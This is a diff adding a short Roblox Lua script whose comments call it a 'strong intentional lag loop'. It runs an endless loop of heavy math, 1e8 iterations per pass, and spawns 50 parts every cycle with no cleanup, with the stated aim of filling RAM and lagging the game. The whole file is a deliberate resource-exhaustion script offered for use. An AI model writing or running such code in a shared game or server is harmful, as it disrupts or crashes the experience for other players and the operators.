@@ -1,0 +1,26 @@
+-- 🔥 STRONG INTENTIONAL LAG LOOP 🔥
+
+while true do
+    -- Super heavy math: larger loop
+    for i = 1, 1e8 do -- Increased from 1e7 to 1e8
+        local a = math.sin(i) * math.cos(i) * math.random()
+    end
+
+    -- Spam bigger parts to fill workspace and RAM
+    for i = 1, 50 do
+        local part = Instance.new("Part")
+        part.Anchored = true
+        part.Size = Vector3.new(2, 2, 2) -- Bigger parts
+        part.Position = Vector3.new(
+            math.random(-500, 500),
+            math.random(5, 50),
+            math.random(-500, 500)
+        )
+        part.Parent = workspace
+        -- Let parts pile up for more lag
+        -- (Remove Debris cleanup for extra RAM usage)
+    end
+
+    -- Smaller wait = less time to breathe
+    task.wait(0.05)
+end
